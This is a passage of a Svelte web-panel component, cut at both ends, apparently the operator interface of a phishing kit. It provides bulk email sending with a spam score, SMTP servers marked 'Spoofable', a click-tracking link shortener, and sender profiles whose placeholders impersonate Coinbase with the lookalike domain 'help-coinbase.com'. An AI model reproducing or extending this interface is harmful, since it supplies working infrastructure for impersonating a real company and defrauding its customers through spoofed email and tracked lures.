						<div class="grid grid-cols-2 gap-2">
							<div>
								<label class="mb-1 block text-[10px] font-semibold uppercase tracking-wider text-[var(--muted-foreground)]">CC</label>
								<input bind:value={ccField} type="text" placeholder="cc@example.com" class="w-full rounded-md border border-[var(--border)] bg-[var(--input)] px-3 py-2 text-xs text-[var(--foreground)] placeholder:text-[var(--text-tertiary)] focus:border-[var(--accent-primary)] focus:outline-none" />
							</div>
							<div>
								<label class="mb-1 block text-[10px] font-semibold uppercase tracking-wider text-[var(--muted-foreground)]">BCC</label>
								<input bind:value={bccField} type="text" placeholder="bcc@example.com" class="w-full rounded-md border border-[var(--border)] bg-[var(--input)] px-3 py-2 text-xs text-[var(--foreground)] placeholder:text-[var(--text-tertiary)] focus:border-[var(--accent-primary)] focus:outline-none" />
							</div>
						</div>

						{#if currentTemplate && templateVariables.length > 0}
							<div class="rounded-md border border-[var(--border)] bg-[var(--input)]/30 p-3">
								<p class="mb-2 text-[10px] font-semibold uppercase tracking-wider text-[var(--muted-foreground)]">Template Variables</p>
								{#if templateVariables.length > manualTemplateVariables.length}
									<p class="mb-2 text-[10px] text-[var(--muted-foreground)]">
										Date, callback date/time, and copyright year update automatically when you send or preview.
									</p>
								{/if}
								<div class="space-y-2">
									{#each manualTemplateVariables as v}
										<div class="flex items-center gap-2">
											<span class="shrink-0 rounded bg-[var(--accent-primary)]/10 px-2 py-0.5 font-mono text-[10px] text-[var(--text-accent)]">{variableLabel(v)}</span>
											<input
												type="text"
												placeholder={`Enter ${variableLabel(v)}`}
												value={variableValues[v] || ''}
												oninput={(e) => { variableValues[v] = (e.target as HTMLInputElement).value; variableValues = { ...variableValues }; }}
												class="min-w-0 flex-1 rounded-md border border-[var(--border)] bg-[var(--input)] px-2 py-1.5 text-[11px] text-[var(--foreground)] focus:border-[var(--accent-primary)] focus:outline-none"
											/>
										</div>
									{/each}
								</div>
							</div>
						{/if}

						{#if editingTemplate && currentTemplate}
							<div>
								<label class="mb-1 block text-[10px] font-semibold uppercase tracking-wider text-[var(--muted-foreground)]">Template HTML (inline edit)</label>
								<textarea
									value={currentTemplate.html}
									oninput={(e) => {
										const html = (e.target as HTMLTextAreaElement).value;
										const idx = templates.findIndex((t) => t.id === selectedTemplateId);
										if (idx !== -1) {
											templates[idx] = { ...templates[idx], html };
											templates = [...templates];
										}
									}}
									rows={8}
									class="w-full resize-y rounded-md border border-[var(--border)] bg-[var(--input)] px-3 py-2 font-mono text-[11px] text-[var(--foreground)] focus:border-[var(--accent-primary)] focus:outline-none"
								></textarea>
							</div>
						{/if}

						<!-- Spam summary (collapsed for brevity) -->
						{#if customSubject || senderName || senderEmail}
							<div class="flex items-center gap-2 rounded-md border border-[var(--border)] px-3 py-2">
								{#if spamScore() >= 80}
									<ShieldCheck size={14} class="text-[var(--status-live)]" />
								{:else if spamScore() >= 50}
									<ShieldAlert size={14} class="text-amber-400" />
								{:else}
									<ShieldAlert size={14} class="text-[var(--destructive)]" />
								{/if}
								<span class="text-xs font-medium text-[var(--foreground)]">Spam Score: {spamScore()}/100</span>
								<span class="ml-auto text-[10px] text-[var(--muted-foreground)]">
									{spamWarnings.length === 0 ? 'Looks good' : `${spamWarnings.length} ${spamWarnings.length === 1 ? 'issue' : 'issues'}`}
								</span>
							</div>
						{/if}

						{#if sendStatus}
							<div class="flex items-center gap-2 rounded-md px-3 py-2 text-xs {sendStatus.type === 'success' ? 'bg-[var(--status-live)]/15 text-[var(--status-live)]' : 'bg-[var(--destructive)]/15 text-[var(--destructive)]'}">
								{#if sendStatus.type === 'success'}<CheckCircle size={13} />{:else}<AlertCircle size={13} />{/if}
								{sendStatus.message}
							</div>
						{/if}
						{#if smtpServers.length === 0}
							<p class="text-center text-[10px] text-[var(--muted-foreground)]">
								Add SMTP servers in the <button type="button" onclick={() => (activeTab = 'smtp')} class="text-[var(--text-accent)] underline">SMTP Servers</button> tab to send emails
							</p>
						{/if}
					</div>
				</div>
			</div>

			<!-- RIGHT: live preview -->
			<div class="space-y-4">
				<!-- Live preview -->
				<div class="rounded-xl border border-[var(--border)] bg-[var(--card)] overflow-hidden" style="box-shadow: var(--shadow-sm);">
					<div class="border-b border-[var(--border)] px-4 py-3 flex items-center justify-between">
						<div class="flex items-center gap-2">
							<Eye size={14} class="text-[var(--text-accent)]" />
							<p class="text-sm font-semibold text-[var(--foreground)]">Live Preview</p>
						</div>
						<div class="flex items-center gap-1 rounded-md border border-[var(--border)] p-0.5">
							<button onclick={() => (previewMode = 'desktop')} class="flex items-center gap-1 rounded px-2 py-1 text-[10px] {previewMode === 'desktop' ? 'bg-[var(--accent-primary)]/15 text-[var(--text-accent)]' : 'text-[var(--muted-foreground)]'}">
								<Monitor size={10} />
								Desktop
							</button>
							<button onclick={() => (previewMode = 'mobile')} class="flex items-center gap-1 rounded px-2 py-1 text-[10px] {previewMode === 'mobile' ? 'bg-[var(--accent-primary)]/15 text-[var(--text-accent)]' : 'text-[var(--muted-foreground)]'}">
								<Smartphone size={10} />
								Mobile
							</button>
						</div>
					</div>
					<!-- From/To preview row -->
					<div class="border-b border-[var(--border-subtle)] bg-[var(--input)]/30 px-4 py-2 text-[11px] space-y-0.5">
						<p class="text-[var(--muted-foreground)]">
							<span class="font-medium text-[var(--foreground)]">From:</span> {senderName || 'Sender'} &lt;{senderEmail || 'sender@example.com'}&gt;
						</p>
						{#if !fullAccessMode}
							<p class="text-[var(--muted-foreground)]">
								<span class="font-medium text-[var(--foreground)]">To:</span> {recipientList.split('\n').filter(Boolean)[0] || 'recipient@example.com'}
							</p>
						{/if}
						<p class="text-[var(--muted-foreground)]">
							<span class="font-medium text-[var(--foreground)]">Subject:</span> {getFilledHtml(customSubject || currentTemplate?.subject || '(no subject)')}
						</p>
						{#if replyTo}
							<p class="text-[var(--muted-foreground)]">
								<span class="font-medium text-[var(--foreground)]">Reply-To:</span> {replyTo}
							</p>
						{/if}
					</div>
					<div class="bg-white" style="height: 560px;">
						<div class="h-full w-full {previewMode === 'mobile' ? 'flex items-center justify-center bg-zinc-100' : ''}">
							<iframe srcdoc={previewHtml} title="Email Preview" class="border-0 {previewMode === 'mobile' ? 'h-[520px] w-[320px] rounded-xl shadow-xl' : 'h-full w-full'}" sandbox="allow-same-origin"></iframe>
						</div>
					</div>
				</div>
			</div>
		</div>
	{:else if activeTab === 'smtp'}
		<!-- ============= SMTP + SENDER DOMAINS ============= -->
		<div class="grid max-w-5xl grid-cols-1 gap-4 lg:grid-cols-2">
			<div class="rounded-xl border border-[var(--border)] bg-[var(--card)] overflow-hidden" style="box-shadow: var(--shadow-sm);">
				<div class="border-b border-[var(--border)] px-4 py-3 flex items-center justify-between">
					<div class="flex items-center gap-2">
						<Server size={14} class="text-[var(--text-accent)]" />
						<p class="text-sm font-semibold text-[var(--foreground)]">SMTP Servers</p>
					</div>
					<button
						onclick={() => { editingSmtpId = ''; newSmtpLabel = ''; newSmtpPass = ''; showAddSmtp = true; }}
						class="btn-accent flex items-center gap-1.5 px-3 py-1.5 text-xs"
					>
						<Plus size={12} />
						Add SMTP
					</button>
				</div>
				<p class="border-b border-[var(--border-subtle)] px-4 py-2 text-xs text-[var(--muted-foreground)]">
					Shared outbound SMTP credentials — saved on the server for every panel user.
				</p>
				<div class="max-h-[480px] overflow-y-auto custom-scrollbar divide-y divide-[var(--border-subtle)]">
					{#each smtpServers as smtp (smtp.id)}
						<div class="flex items-center justify-between gap-2 p-4 hover:bg-[var(--accent)]/30">
							<div class="min-w-0">
								<p class="truncate text-xs font-semibold text-[var(--foreground)]">{smtp.label}</p>
								<p class="font-mono text-[10px] text-[var(--muted-foreground)]">{smtp.host}:{smtp.port} · {smtp.user}</p>
								<p class="text-[10px] text-[var(--muted-foreground)]">
									{smtp.useSSL ? 'SSL' : 'STARTTLS'}{smtp.spoofable ? ' · spoofable' : ''}
									{smtp.hasPassword ? '' : ' · no password stored'}
									· added by {smtp.createdBy || '—'}
								</p>
							</div>
							<div class="flex shrink-0 items-center gap-1">
								<button onclick={() => openEditSmtp(smtp)} class="rounded-md border border-[var(--border)] px-2 py-1 text-[10px] text-[var(--muted-foreground)] hover:bg-[var(--accent)]">Edit</button>
								<button onclick={() => removeSmtp(smtp.id)} class="rounded-md p-1.5 text-[var(--muted-foreground)] hover:bg-[var(--destructive)]/10 hover:text-[var(--destructive)]" aria-label="Remove SMTP">
									<Trash2 size={11} />
								</button>
							</div>
						</div>
					{/each}
					{#if smtpServers.length === 0}
						<p class="px-4 py-12 text-center text-xs text-[var(--muted-foreground)]">No SMTP servers yet. Add the host, port, and mailbox you purchased.</p>
					{/if}
				</div>
			</div>

			<div class="rounded-xl border border-[var(--border)] bg-[var(--card)] overflow-hidden" style="box-shadow: var(--shadow-sm);">
				<div class="border-b border-[var(--border)] px-4 py-3 flex items-center justify-between">
					<div class="flex items-center gap-2">
						<Globe size={14} class="text-[var(--text-accent)]" />
						<p class="text-sm font-semibold text-[var(--foreground)]">Sender Domains &amp; Emails</p>
					</div>
					<button onclick={() => (showAddSender = true)} class="btn-accent flex items-center gap-1.5 px-3 py-1.5 text-xs">
						<Plus size={12} />
						Add sender
					</button>
				</div>
				<p class="border-b border-[var(--border-subtle)] px-4 py-2 text-xs text-[var(--muted-foreground)]">
					Domains and From addresses you own — pick these in Email Sender to auto-fill name, email, and SMTP.
				</p>
				<div class="max-h-[480px] overflow-y-auto custom-scrollbar divide-y divide-[var(--border-subtle)]">
					{#each senderIdentities as s (s.id)}
						<div class="flex items-center justify-between gap-2 p-4 hover:bg-[var(--accent)]/30">
							<div class="min-w-0">
								<p class="truncate text-xs font-semibold text-[var(--foreground)]">{s.label}</p>
								<p class="font-mono text-[10px] text-[var(--text-accent)]">{s.fromEmail}</p>
								<p class="text-[10px] text-[var(--muted-foreground)]">
									Domain: {s.domain}
									{#if s.smtpId}
										· SMTP linked
									{/if}
									· {s.createdBy}
								</p>
								{#if s.notes}
									<p class="mt-0.5 truncate text-[10px] text-[var(--muted-foreground)]">{s.notes}</p>
								{/if}
							</div>
							<button onclick={() => removeSender(s.id)} class="shrink-0 rounded-md p-1.5 text-[var(--muted-foreground)] hover:bg-[var(--destructive)]/10 hover:text-[var(--destructive)]" aria-label="Remove sender">
								<Trash2 size={11} />
							</button>
						</div>
					{/each}
					{#if senderIdentities.length === 0}
						<p class="px-4 py-12 text-center text-xs text-[var(--muted-foreground)]">No sender profiles yet. Add your purchased domain and mailbox address.</p>
					{/if}
				</div>
			</div>
		</div>
	{:else if activeTab === 'log'}
		<!-- ============= EMAIL LOG ============= -->
		<div class="space-y-4">
			<div class="rounded-xl border border-[var(--border)] bg-[var(--card)]">
				<div class="flex flex-wrap items-center justify-between gap-2 border-b border-[var(--border)] px-4 py-3">
					<div class="flex items-center gap-3">
						<Activity size={14} class="text-[var(--text-accent)]" />
						<h2 class="text-sm font-semibold text-[var(--foreground)]">Email Send Log</h2>
						<span class="text-xs text-[var(--muted-foreground)]">{emailLogTotal} total</span>
					</div>
					<div class="flex items-center gap-2">
						<div class="flex items-center gap-1.5 rounded-lg border border-[var(--border)] bg-[var(--input)] px-2.5 py-1.5">
							<Search size={11} class="text-[var(--muted-foreground)]" />
							<input bind:value={emailLogSearch} oninput={() => { emailLogPage = 1; fetchEmailLog(); }} type="text" placeholder="Search..." class="w-28 bg-transparent text-xs text-[var(--foreground)] outline-none placeholder:text-[var(--text-tertiary)]" />
						</div>
						<select bind:value={emailLogStatus} onchange={() => { emailLogPage = 1; fetchEmailLog(); }} class="rounded-lg border border-[var(--border)] bg-[var(--input)] px-2.5 py-1.5 text-xs text-[var(--foreground)] focus:outline-none">
							<option value="">All</option>
							<option value="success">Success</option>
							<option value="failed">Failed</option>
						</select>
						<button onclick={exportEmailLogCsv} class="flex items-center gap-1 rounded-lg border border-[var(--border)] px-2.5 py-1.5 text-[11px] text-[var(--muted-foreground)] transition-soft hover:bg-[var(--accent)]">
							<BarChart3 size={11} /> Export CSV
						</button>
						<button onclick={clearEmailLog} class="flex items-center gap-1 rounded-lg border border-red-500/30 bg-red-500/10 px-2.5 py-1.5 text-[11px] text-red-400 transition-soft hover:bg-red-500/20">
							<Trash2 size={11} /> Clear
						</button>
						<button onclick={fetchEmailLog} class="rounded-lg p-1.5 text-[var(--muted-foreground)] transition-soft hover:bg-[var(--accent)]" aria-label="Refresh">
							<RefreshCw size={12} class={emailLogLoading ? 'animate-spin' : ''} />
						</button>
					</div>
				</div>
				<div class="overflow-x-auto">
					<table class="w-full text-left text-xs">
						<thead class="bg-[var(--input)]/40 text-[10px] uppercase tracking-wider text-[var(--muted-foreground)]">
							<tr>
								<th class="px-3 py-2">Time</th>
								<th class="px-3 py-2">From</th>
								<th class="px-3 py-2">To</th>
								<th class="px-3 py-2">Subject</th>
								<th class="px-3 py-2">SMTP</th>
								<th class="px-3 py-2">Status</th>
								<th class="px-3 py-2">Sent by</th>
							</tr>
						</thead>
						<tbody>
							{#each emailLog as row}
								<tr class="border-t border-[var(--border-subtle)]">
									<td class="px-3 py-2 text-[var(--muted-foreground)] whitespace-nowrap">{new Date(row.createdAt).toLocaleString()}</td>
									<td class="px-3 py-2 text-[var(--foreground)]">
										{#if row.fromName}<span class="text-[var(--muted-foreground)]">{row.fromName}</span>{/if}
										<span class="font-mono text-[11px]">{row.fromEmail}</span>
									</td>
									<td class="px-3 py-2 font-mono text-[var(--foreground)]">{row.toAddr}</td>
									<td class="px-3 py-2 text-[var(--foreground)] max-w-[200px] truncate">{row.subject}</td>
									<td class="px-3 py-2 text-[var(--muted-foreground)]">{row.smtpLabel}</td>
									<td class="px-3 py-2">
										{#if row.status === 'success'}
											<span class="inline-flex items-center gap-1 rounded-md bg-emerald-500/15 px-2 py-0.5 text-[10px] font-medium text-emerald-300">
												<CheckCircle size={10} /> Sent
											</span>
										{:else}
											<span class="inline-flex items-center gap-1 rounded-md bg-red-500/15 px-2 py-0.5 text-[10px] font-medium text-red-300" title={row.error}>
												<AlertCircle size={10} /> Failed
											</span>
										{/if}
									</td>
									<td class="px-3 py-2 text-[var(--muted-foreground)]">{row.sentBy}</td>
								</tr>
							{/each}
							{#if emailLog.length === 0 && !emailLogLoading}
								<tr>
									<td colspan="7" class="px-3 py-12 text-center text-[var(--muted-foreground)]">No emails sent yet.</td>
								</tr>
							{/if}
							{#if emailLogLoading}
								<tr>
									<td colspan="7" class="px-3 py-12 text-center text-[var(--muted-foreground)]">
										<RefreshCw size={14} class="inline animate-spin" /> Loading...
									</td>
								</tr>
							{/if}
						</tbody>
					</table>
				</div>
				{#if emailLogTotal > 25}
					<div class="flex items-center justify-between border-t border-[var(--border)] px-4 py-2">
						<span class="text-xs text-[var(--muted-foreground)]">Page {emailLogPage} of {Math.ceil(emailLogTotal / 25)}</span>
						<div class="flex items-center gap-1">
							<button onclick={() => { emailLogPage = Math.max(1, emailLogPage - 1); fetchEmailLog(); }} disabled={emailLogPage <= 1} class="rounded-md border border-[var(--border)] px-2.5 py-1 text-xs text-[var(--muted-foreground)] transition-soft hover:bg-[var(--accent)] disabled:opacity-30">Prev</button>
							<button onclick={() => { emailLogPage++; fetchEmailLog(); }} disabled={emailLogPage >= Math.ceil(emailLogTotal / 25)} class="rounded-md border border-[var(--border)] px-2.5 py-1 text-xs text-[var(--muted-foreground)] transition-soft hover:bg-[var(--accent)] disabled:opacity-30">Next</button>
						</div>
					</div>
				{/if}
			</div>
		</div>
	{:else}
		<!-- ============= URL PROTECTOR ============= -->
		<div class="space-y-4">
			<!-- Stat cards -->
			<div class="grid grid-cols-1 gap-3 sm:grid-cols-3">
				<div class="rounded-xl border border-[var(--border)] bg-[var(--card)] p-4">
					<div class="flex items-center justify-between">
						<p class="text-[10px] font-semibold uppercase tracking-wider text-[var(--muted-foreground)]">Your URLs</p>
						<div class="flex h-7 w-7 items-center justify-center rounded-md bg-[var(--accent-primary)]/10 text-[var(--text-accent)]">
							<LinkIcon size={13} />
						</div>
					</div>
					<p class="mt-2 text-2xl font-bold text-[var(--foreground)]">{urlStats.total}</p>
					<p class="text-[10px] text-[var(--muted-foreground)]">Personal URLs created</p>
				</div>
				<div class="rounded-xl border border-[var(--border)] bg-[var(--card)] p-4">
					<div class="flex items-center justify-between">
						<p class="text-[10px] font-semibold uppercase tracking-wider text-[var(--muted-foreground)]">Your Clicks</p>
						<div class="flex h-7 w-7 items-center justify-center rounded-md bg-cyan-500/10 text-cyan-300">
							<BarChart3 size={13} />
						</div>
					</div>
					<p class="mt-2 text-2xl font-bold text-[var(--foreground)]">{urlStats.clicks}</p>
					<p class="text-[10px] text-[var(--muted-foreground)]">Clicks on your URLs</p>
				</div>
				<div class="rounded-xl border border-[var(--border)] bg-[var(--card)] p-4">
					<div class="flex items-center justify-between">
						<p class="text-[10px] font-semibold uppercase tracking-wider text-[var(--muted-foreground)]">Your Active</p>
						<div class="flex h-7 w-7 items-center justify-center rounded-md bg-emerald-500/10 text-emerald-300">
							<Activity size={13} />
						</div>
					</div>
					<p class="mt-2 text-2xl font-bold text-[var(--foreground)]">{urlStats.active}</p>
					<p class="text-[10px] text-[var(--muted-foreground)]">Currently active URLs</p>
				</div>
			</div>

			<!-- URL list -->
			<div class="rounded-xl border border-[var(--border)] bg-[var(--card)] overflow-hidden" style="box-shadow: var(--shadow-sm);">
				<div class="border-b border-[var(--border)] px-5 py-3 flex flex-wrap items-center justify-between gap-3">
					<div class="flex items-center gap-2">
						<LinkIcon size={14} class="text-[var(--text-accent)]" />
						<p class="text-sm font-semibold text-[var(--foreground)]">Your Protected URLs</p>
						<p class="text-[11px] text-[var(--muted-foreground)]">Private shortener — only you see and manage</p>
					</div>
					<div class="flex items-center gap-2">
						<div class="relative">
							<Search size={11} class="absolute left-2.5 top-1/2 -translate-y-1/2 text-[var(--text-tertiary)]" />
							<input bind:value={urlSearch} type="text" placeholder="Search URLs..." class="w-56 rounded-md border border-[var(--border)] bg-[var(--input)] py-1.5 pl-7 pr-2 text-xs text-[var(--foreground)] placeholder:text-[var(--text-tertiary)] focus:border-[var(--accent-primary)] focus:outline-none" />
						</div>
						<button onclick={fetchProtectedUrls} class="rounded-md border border-[var(--border)] p-1.5 text-[var(--muted-foreground)] hover:bg-[var(--accent)]" aria-label="Refresh">
							<RefreshCw size={12} />
						</button>
						<button onclick={() => (showAddUrl = true)} class="btn-accent flex items-center gap-1.5 px-3 py-1.5 text-xs">
							<Plus size={12} />
							Add URL
						</button>
					</div>
				</div>

				{#if filteredUrls.length === 0}
					<div class="flex flex-col items-center justify-center py-16 text-center">
						<LinkIcon size={36} class="mb-2 text-[var(--text-tertiary)]" />
						<p class="text-sm font-semibold text-[var(--foreground)]">No protected URLs yet</p>
						<p class="mt-1 text-xs text-[var(--muted-foreground)]">Click "Add URL" to create your first short link.</p>
					</div>
				{:else}
					<div class="grid grid-cols-[2fr_2fr_80px_100px_100px_120px] gap-4 border-b border-[var(--border-subtle)] bg-[var(--input)]/30 px-5 py-2 text-[10px] font-semibold uppercase tracking-wider text-[var(--muted-foreground)]">
						<span>Short URL</span>
						<span>Original URL</span>
						<span>Clicks</span>
						<span>Status</span>
						<span>Created</span>
						<span class="text-right">Actions</span>
					</div>
					<div class="max-h-[60vh] overflow-y-auto custom-scrollbar">
						{#each filteredUrls as u (u.id)}
							<div class="grid grid-cols-[2fr_2fr_80px_100px_100px_120px] items-center gap-4 border-b border-[var(--border-subtle)] px-5 py-3 hover:bg-[var(--accent)]/30">
								<div class="min-w-0">
									<p class="truncate font-mono text-xs text-[var(--foreground)]">/u/{u.shortCode}</p>
									<button onclick={() => copyShort(u)} class="mt-0.5 inline-flex items-center gap-1 text-[10px] text-[var(--muted-foreground)] hover:text-[var(--text-accent)]">
										{#if copiedShort === u.id}
											<Check size={10} class="text-[var(--status-live)]" />
											Copied!
										{:else}
											<Copy size={10} />
											Copy full link
										{/if}
									</button>
								</div>
								<a href={u.originalUrl} target="_blank" rel="noopener" class="truncate text-xs text-[var(--text-accent)] hover:underline">{u.originalUrl}</a>
								<span class="font-mono text-xs text-[var(--foreground)]">{u.clicks}</span>
								<span class="inline-flex w-fit items-center rounded-md border px-2 py-0.5 text-[10px] font-medium {u.status === 'active' ? 'border-[var(--status-live)]/30 bg-[var(--status-live)]/10 text-[var(--status-live)]' : 'border-[var(--border)] text-[var(--muted-foreground)]'}">
									{u.status}
								</span>
								<span class="text-[11px] text-[var(--muted-foreground)]">{fmtDate(u.createdAt)}</span>
								<div class="flex items-center justify-end gap-1">
									<button onclick={() => toggleUrl(u)} class="rounded-md border border-[var(--border)] px-2 py-1 text-[10px] text-[var(--muted-foreground)] hover:bg-[var(--accent)] hover:text-[var(--foreground)]">
										{u.status === 'active' ? 'Deactivate' : 'Activate'}
									</button>
									<button onclick={() => deleteUrl(u)} class="rounded-md p-1 text-[var(--muted-foreground)] hover:bg-[var(--destructive)]/10 hover:text-[var(--destructive)]" aria-label="Delete">
										<Trash2 size={11} />
									</button>
								</div>
							</div>
						{/each}
					</div>
				{/if}
			</div>
		</div>
	{/if}
</div>

<!-- ===================== MODALS ===================== -->

<!-- Add SMTP -->
{#if showAddSmtp}
	<div class="fixed inset-0 z-50 flex items-center justify-center bg-black/60 backdrop-blur-sm" onclick={() => (showAddSmtp = false)}>
		<div class="w-full max-w-md rounded-xl border border-[var(--border)] bg-[var(--card)] p-6 shadow-2xl" onclick={(e) => e.stopPropagation()}>
			<div class="mb-4 flex items-center justify-between">
				<h3 class="text-base font-semibold text-[var(--foreground)]">{editingSmtpId ? 'Edit SMTP' : 'Add SMTP'}</h3>
				<button onclick={() => (showAddSmtp = false)} class="rounded-lg p-1.5 text-[var(--muted-foreground)] hover:bg-[var(--accent)]" aria-label="Close"><X size={16} /></button>
			</div>
			<p class="mb-3 text-xs text-[var(--muted-foreground)]">Stored on the server — visible to all panel users.</p>
			<div class="space-y-3">
				{#if !editingSmtpId}
					<div>
						<label class="mb-1 block text-xs font-medium text-[var(--foreground)]">Provider (quick-fill)</label>
						<select bind:value={smtpProvider} onchange={onProviderChange} class="w-full rounded-md border border-[var(--border)] bg-[var(--input)] px-3 py-2 text-sm text-[var(--foreground)] focus:border-[var(--accent-primary)] focus:outline-none">
							{#each SMTP_PROVIDERS as p}
								<option value={p.id}>{p.label}</option>
							{/each}
						</select>
						{#if smtpProvider === 'gmail'}
							<p class="mt-1 text-[10px] text-[var(--muted-foreground)]">Use a <a href="https://myaccount.google.com/apppasswords" target="_blank" class="text-[var(--text-accent)] underline">Google App Password</a> (16 chars, requires 2-Step Verification).</p>
						{:else if smtpProvider === 'outlook'}
							<p class="mt-1 text-[10px] text-[var(--muted-foreground)]">Use an <a href="https://account.live.com/proofs/AppPassword" target="_blank" class="text-[var(--text-accent)] underline">Outlook App Password</a>.</p>
						{:else if smtpProvider === 'yahoo'}
							<p class="mt-1 text-[10px] text-[var(--muted-foreground)]">Use a <a href="https://login.yahoo.com/myaccount/security" target="_blank" class="text-[var(--text-accent)] underline">Yahoo App Password</a>.</p>
						{:else if smtpProvider === 'ses'}
							<p class="mt-1 text-[10px] text-[var(--muted-foreground)]">Use AWS SES SMTP credentials (not IAM keys). Change the host region as needed (e.g. <code>email-smtp.eu-west-1.amazonaws.com</code>). From domain must be verified in SES.</p>
						{/if}
					</div>
				{/if}
				<div>
					<label class="mb-1 block text-xs font-medium text-[var(--foreground)]">Label</label>
					<input bind:value={newSmtpLabel} type="text" placeholder="Primary Coinbase SMTP" class="w-full rounded-md border border-[var(--border)] bg-[var(--input)] px-3 py-2 text-sm text-[var(--foreground)] focus:border-[var(--accent-primary)] focus:outline-none" />
				</div>
				<div>
					<label class="mb-1 block text-xs font-medium text-[var(--foreground)]">SMTP host</label>
					<input bind:value={newSmtpHost} type="text" placeholder="smtp.example.com" class="w-full rounded-md border border-[var(--border)] bg-[var(--input)] px-3 py-2 text-sm text-[var(--foreground)] focus:border-[var(--accent-primary)] focus:outline-none" />
				</div>
				<div>
					<label class="mb-1 block text-xs font-medium text-[var(--foreground)]">SMTP port</label>
					<input bind:value={newSmtpPort} type="number" class="w-full rounded-md border border-[var(--border)] bg-[var(--input)] px-3 py-2 text-sm text-[var(--foreground)] focus:border-[var(--accent-primary)] focus:outline-none" />
				</div>
				<div>
					<label class="mb-1 block text-xs font-medium text-[var(--foreground)]">SMTP username</label>
					<input bind:value={newSmtpUser} type="text" placeholder="user@example.com" class="w-full rounded-md border border-[var(--border)] bg-[var(--input)] px-3 py-2 text-sm text-[var(--foreground)] focus:border-[var(--accent-primary)] focus:outline-none" />
				</div>
				<div>
					<label class="mb-1 block text-xs font-medium text-[var(--foreground)]">SMTP password</label>
					<input bind:value={newSmtpPass} type="password" placeholder={editingSmtpId ? 'Leave blank to keep current' : ''} class="w-full rounded-md border border-[var(--border)] bg-[var(--input)] px-3 py-2 text-sm text-[var(--foreground)] focus:border-[var(--accent-primary)] focus:outline-none" />
				</div>
				<div class="flex items-center gap-4 pt-1">
					<label class="flex items-center gap-2 text-xs text-[var(--foreground)]">
						<input type="checkbox" bind:checked={newSmtpSSL} class="h-3.5 w-3.5 accent-[var(--accent-primary)]" />
						Use SSL
					</label>
					<label class="flex items-center gap-2 text-xs text-[var(--foreground)]">
						<input type="checkbox" bind:checked={newSmtpSpoofable} class="h-3.5 w-3.5 accent-[var(--accent-primary)]" />
						Spoofable
					</label>
				</div>
			</div>
			<div class="mt-4 flex items-center gap-2">
				<button
					type="button"
					onclick={testConnection}
					disabled={testingConnection || !newSmtpUser.trim() || !newSmtpPass.trim()}
					class="flex items-center gap-1.5 rounded-md border border-[var(--border)] px-3 py-1.5 text-xs text-[var(--muted-foreground)] transition-soft hover:bg-[var(--accent)] disabled:opacity-40"
				>
					{#if testingConnection}
						<Loader size={11} class="animate-spin" /> Testing...
					{:else}
						<ShieldCheck size={11} /> Test Connection
					{/if}
				</button>
				{#if testResult}
					<span class="text-xs {testResult.ok ? 'text-emerald-400' : 'text-red-400'}">
						{testResult.ok ? 'Connected' : testResult.error}
					</span>
				{/if}
			</div>
			<div class="mt-4 flex justify-end gap-2">
				<button onclick={() => (showAddSmtp = false)} class="rounded-md border border-[var(--border)] px-4 py-2 text-xs text-[var(--muted-foreground)] hover:bg-[var(--accent)]">Cancel</button>
				<button onclick={addSmtp} class="btn-accent px-4 py-2 text-xs">{editingSmtpId ? 'Save' : 'Add'}</button>
			</div>
		</div>
	</div>
{/if}

{#if showAddSender}
	<div class="fixed inset-0 z-50 flex items-center justify-center bg-black/60 backdrop-blur-sm" onclick={() => (showAddSender = false)}>
		<div class="w-full max-w-md rounded-xl border border-[var(--border)] bg-[var(--card)] p-6 shadow-2xl" onclick={(e) => e.stopPropagation()}>
			<div class="mb-4 flex items-center justify-between">
				<h3 class="text-base font-semibold text-[var(--foreground)]">Add sender domain</h3>
				<button onclick={() => (showAddSender = false)} class="rounded-lg p-1.5 text-[var(--muted-foreground)] hover:bg-[var(--accent)]" aria-label="Close"><X size={16} /></button>
			</div>
			<p class="mb-3 text-xs text-[var(--muted-foreground)]">Shared with all users — links a domain and From address to an SMTP server.</p>
			<div class="space-y-3">
				<div>
					<label class="mb-1 block text-xs font-medium text-[var(--foreground)]">Label</label>
					<input bind:value={newSenderLabel} type="text" placeholder="Coinbase security domain" class="w-full rounded-md border border-[var(--border)] bg-[var(--input)] px-3 py-2 text-sm text-[var(--foreground)] focus:border-[var(--accent-primary)] focus:outline-none" />
				</div>
				<div>
					<label class="mb-1 block text-xs font-medium text-[var(--foreground)]">Domain</label>
					<input bind:value={newSenderDomain} type="text" placeholder="help-coinbase.com" class="w-full rounded-md border border-[var(--border)] bg-[var(--input)] px-3 py-2 text-sm text-[var(--foreground)] focus:border-[var(--accent-primary)] focus:outline-none" />
				</div>
				<div>
					<label class="mb-1 block text-xs font-medium text-[var(--foreground)]">From email</label>
					<input bind:value={newSenderEmail} type="email" placeholder="noreply@help-coinbase.com" class="w-full rounded-md border border-[var(--border)] bg-[var(--input)] px-3 py-2 text-sm text-[var(--foreground)] focus:border-[var(--accent-primary)] focus:outline-none" />
				</div>
				<div>
					<label class="mb-1 block text-xs font-medium text-[var(--foreground)]">Display name</label>
					<input bind:value={newSenderName} type="text" placeholder="Coinbase" class="w-full rounded-md border border-[var(--border)] bg-[var(--input)] px-3 py-2 text-sm text-[var(--foreground)] focus:border-[var(--accent-primary)] focus:outline-none" />
				</div>
				<div>
					<label class="mb-1 block text-xs font-medium text-[var(--foreground)]">SMTP server</label>
					<select bind:value={newSenderSmtpId} class="w-full rounded-md border border-[var(--border)] bg-[var(--input)] px-3 py-2 text-sm text-[var(--foreground)] focus:border-[var(--accent-primary)] focus:outline-none">
						<option value="">None (select manually when sending)</option>
						{#each smtpServers as smtp}
							<option value={smtp.id}>{smtp.label} — {smtp.host}</option>
						{/each}
					</select>
				</div>
				<div>
					<label class="mb-1 block text-xs font-medium text-[var(--foreground)]">Notes (optional)</label>
					<input bind:value={newSenderNotes} type="text" placeholder="Purchased Mar 2026" class="w-full rounded-md border border-[var(--border)] bg-[var(--input)] px-3 py-2 text-sm text-[var(--foreground)] focus:border-[var(--accent-primary)] focus:outline-none" />
				</div>
			</div>
			<div class="mt-5 flex justify-end gap-2">
				<button onclick={() => (showAddSender = false)} class="rounded-md border border-[var(--border)] px-4 py-2 text-xs text-[var(--muted-foreground)] hover:bg-[var(--accent)]">Cancel</button>
				<button onclick={addSender} class="btn-accent px-4 py-2 text-xs">Add</button>
			</div>
		</div>
	</div>
{/if}

<!-- Save Preset -->
{#if showSavePreset}
	<div class="fixed inset-0 z-50 flex items-center justify-center bg-black/60 backdrop-blur-sm" onclick={() => (showSavePreset = false)}>
